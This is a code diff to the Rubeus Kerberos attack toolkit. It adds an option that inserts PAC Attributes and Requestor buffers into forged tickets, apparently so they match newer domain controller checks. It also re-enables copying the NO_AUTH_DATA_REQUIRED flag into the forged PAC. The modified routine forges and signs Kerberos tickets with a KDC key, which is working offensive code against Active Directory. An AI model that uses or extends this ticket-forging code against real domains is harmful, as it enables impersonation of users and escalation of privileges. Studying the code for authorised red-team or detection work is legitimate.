@@ -61,6 +61,7 @@ namespace Rubeus
             string resourceGroupSid = "",
             List<int> resourceGroups = null,
             Interop.PacUserAccountControl uac = Interop.PacUserAccountControl.NORMAL_ACCOUNT,
+            bool newPac = false,
             // arguments to deal with resulting ticket(s)
             string outfile = null,
             bool ptt = false,
@@ -298,11 +299,10 @@ namespace Rubeus
                         {
                             kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.TRUSTED_TO_AUTH_FOR_DELEGATION;
                         }
-                        /* No NO_AUTH_DATA_REQUIRED bit seems to exist in the UAC field returned by LDAP
                         if ((userUAC & Interop.LDAPUserAccountControl.NO_AUTH_DATA_REQUIRED) != 0)
                         {
                             kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.NO_AUTH_DATA_REQUIRED;
-                        }*/
+                        }
                         if ((userUAC & Interop.LDAPUserAccountControl.PARTIAL_SECRETS_ACCOUNT) != 0)
                         {
                             kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.PARTIAL_SECRETS_ACCOUNT;
@@ -825,6 +825,14 @@ namespace Rubeus
                     ticketSigData.Signature = decTicketPart.CalculateTicketChecksum(krbKey, kdcSigData.SignatureType);
                 }
 
+                Attributes attrib = null;
+                Requestor requestor = null;
+                if (newPac)
+                {
+                    attrib = new Attributes();
+                    requestor = new Requestor(String.Format("{0}-{1}", li.KerbValidationInfo.LogonDomainId?.GetValue(), li.KerbValidationInfo.UserId));
+                }
+
                 // clear signatures
                 Console.WriteLine("[*] Signing PAC");
                 svrSigData.Signature = new byte[svrSigLength];
@@ -841,6 +849,11 @@ namespace Rubeus
                 PacInfoBuffers.Add(li);
                 PacInfoBuffers.Add(cn);
                 PacInfoBuffers.Add(upnDns);
+                if (newPac)
+                {
+                    PacInfoBuffers.Add(attrib);
+                    PacInfoBuffers.Add(requestor);
+                }
                 PacInfoBuffers.Add(svrSigData);
                 PacInfoBuffers.Add(kdcSigData);
                 if (ticketSigData != null)
@@ -863,6 +876,11 @@ namespace Rubeus
                 PacInfoBuffers.Add(li);
                 PacInfoBuffers.Add(cn);
                 PacInfoBuffers.Add(upnDns);
+                if (newPac)
+                {
+                    PacInfoBuffers.Add(attrib);
+                    PacInfoBuffers.Add(requestor);
+                }
                 PacInfoBuffers.Add(svrSigData);
                 PacInfoBuffers.Add(kdcSigData);
                 if (ticketSigData != null)
